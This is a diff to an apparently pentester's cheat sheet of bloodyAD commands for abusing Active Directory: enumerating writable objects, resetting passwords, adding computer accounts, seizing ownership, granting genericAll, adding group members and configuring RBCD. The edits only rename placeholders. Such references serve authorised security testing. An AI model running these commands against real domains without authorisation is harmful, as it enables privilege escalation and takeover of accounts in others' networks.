@@ -3,7 +3,7 @@
 
 ## Get writable
 ```
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> get writable
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> get writable --partition DOMAIN
 ```
 
 ## Set password
@@ -13,22 +13,22 @@ bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set password '<target_o
 
 ## Add computer
 ```
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add computer BEANS '<new_password|Password123!>'
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add computer '<computer_name|PENTEST>' '<new_password|Password123!>'
 ```
 
 ## Set owner
 ```
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <trustee>
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <principal>
 ```
 
 ## Add genericAll
 ```
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <trustee>
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <principal>
 ```
 
 ## Add groupMember
 ```
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add groupMember '<target_obj>' <trustee>
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add groupMember '<target_obj>' <principal>
 ```
 
 ## Set object
@@ -43,7 +43,7 @@ bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add uac '<target_obj>' 
 
 ## Add RBCD
 ```
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add rbcd '<target_obj>' <trustee>
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add rbcd '<target_obj>' <principal>
 ```
 
 ## Enable account
@@ -58,6 +58,6 @@ bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add dnsRecord <record_n
 
 ## Abuse writeOwner
 ```
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <trustee>
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <trustee>
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <principal>
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <principal>
 ```
